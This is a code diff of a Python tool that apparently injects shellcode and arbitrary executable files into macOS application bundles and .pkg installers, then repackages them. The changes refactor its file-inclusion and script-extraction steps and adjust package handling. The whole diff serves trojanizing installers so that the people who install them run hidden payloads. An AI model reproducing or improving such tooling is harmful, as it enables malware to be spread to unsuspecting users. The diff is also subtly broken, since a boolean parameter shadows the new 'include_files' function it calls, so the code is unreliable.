@@ -3,10 +3,42 @@ from os import chdir, makedirs, path
 from subprocess import call
 
 from .get_app import get_app_name
-from .logic import check_app_path, check_inputs, check_pkg_path
+from .logic import (check_app_path, check_inputs, check_pkg_path,
+                    extracting_scripts)
 
 C_None = "\x1b[0;39m"
 C_BRed = "\x1b[1;31m"
+
+
+def include_files(args):
+
+    print("[i] Including the content of the given folder...")
+
+    if path.isdir(args.include[0]):
+        print(f"[+] Getting the files: {args.include[0]}")
+
+    else:
+        print(C_BRed + f"[!] Cannot find folder to include: {args.include[0]}" + C_None)
+        quit()
+
+    try:
+
+        call(f"cp -a '{args.include[0]}/.' .", shell=True)
+
+    except Exception:
+
+        print(C_BRed + "[!] Cannot include the files." + C_None)
+        quit()
+
+    print("[i] Make the included files executable...")
+    try:
+
+        call("chmod +x *", shell=True)
+
+    except Exception:
+
+        print(C_BRed + "[!] Cannot make the files executable." + C_None)
+        quit()
 
 
 def inject_app(args, include_files):
@@ -51,33 +83,7 @@ def inject_app(args, include_files):
     # 5 | Including files
     if include_files:
 
-        print("[i] Including the content of the given folder...")
-
-        if path.isdir(args.include[0]):
-            print(f"[+] Getting the files: {args.include[0]}")
-
-        else:
-            print(C_BRed + f"[!] Cannot find folder to include: {args.include[0]}" + C_None)
-            quit()
-
-        try:
-
-            call(f"cp -a '{args.include[0]}/.' .", shell=True)
-
-        except Exception:
-
-            print(C_BRed + "[!] Cannot include the files." + C_None)
-            quit()
-
-        print("[i] Make the included files executable...")
-        try:
-
-            call("chmod +x *", shell=True)
-
-        except Exception:
-
-            print(C_BRed + "[!] Cannot make the files executable." + C_None)
-            quit()
+        include_files(args)
 
     # 6 | Changing the start order
     print("[i] Changing the start order...")
@@ -142,7 +148,15 @@ def inject_pkg(args, include_files):
     # 2 | Checking for a vallid input
     output = check_inputs(args)
 
-    # 3 | Cloning the package
+    if output[:-1] == "/":
+
+        output = output.split("/")[-2]
+
+    else:
+
+        output = output.split("/")[-1]
+
+    # 3 | Creating temporary directory
     print("[i] Creating temporary directory...")
 
     if path.isfile(output) or path.isfile(args.output[0]):
@@ -169,7 +183,7 @@ def inject_pkg(args, include_files):
 
     try:
 
-        call(f"xar -xf '../{output}'", shell=True)
+        call(f"xar -xf '{args.pkg[0]}'", shell=True)
 
     except Exception:
 
@@ -200,7 +214,9 @@ def inject_pkg(args, include_files):
 
                 inject_pkg = injectable_pkgs[int(input("[-] Please select the sub-package from the above list you would like to inject: "))]
 
-            except KeyError:
+                break
+
+            except IndexError:
 
                 pass
 
@@ -209,32 +225,7 @@ def inject_pkg(args, include_files):
         chdir(inject_pkg)
 
     # 6 | Extract scripts
-    print("[i] Setting up extraction environment.")
-
-    try:
-
-        call("mv Scripts Scripts.tmp", shell=True)
-
-        makedirs("Scripts")
-        chdir("Scripts")
-
-    except Exception:
-
-        print(C_BRed + "[!] Could not create extraction environment." + C_None)
-        quit()
-
-    print("[i] Extracting scripts...")
-
-    try:
-
-        call("cpio -i -F ../Scripts.tmp", shell=True)
-        call("rm ../Scripts.tmp", shell=True)
-
-    except Exception:
-
-        print(C_BRed + "[!] Could not extract Scripts." + C_None)
-        print("[i] Make sure cpio is available.")
-        quit()
+    extracting_scripts()
 
     # 7 | Moving necessary files
     print("[i] Inserting shellcode.")
@@ -249,23 +240,7 @@ def inject_pkg(args, include_files):
 
     if include_files:
 
-        print("[i] Including the content of the given folder...")
-
-        if path.isdir(args.include[0]):
-            print(f"[+] Getting the files: {args.include[0]}")
-
-        else:
-            print(C_BRed + f"[!] Cannot find folder to include: {args.include[0]}" + C_None)
-            quit()
-
-        try:
-
-            call(f"cp -a '{args.include[0]}/.' .", shell=True)
-
-        except Exception:
-
-            print(C_BRed + "[!] Cannot include the files." + C_None)
-            quit()
+        include_files(args)
 
     # 8 | Searching injectable script
     print("[i] Finding script to inject.")
@@ -315,7 +290,12 @@ def inject_pkg(args, include_files):
 
     try:
 
-        chdir("../../")
+        if inject_pkg is not None:
+            chdir("../../")
+
+        else:
+            chdir("../")
+
         call(f"pkgutil --flatten . {args.output[0]}", shell=True)
 
     except Exception:
@@ -330,7 +310,7 @@ def inject_pkg(args, include_files):
     try:
 
         print("Please answer with yes...")
-        call(f"rm -i -rf '.tmp_{output}'", shell=True)
+        call(f"rm -rI '.tmp_{output}'", shell=True)
 
     except Exception:
 
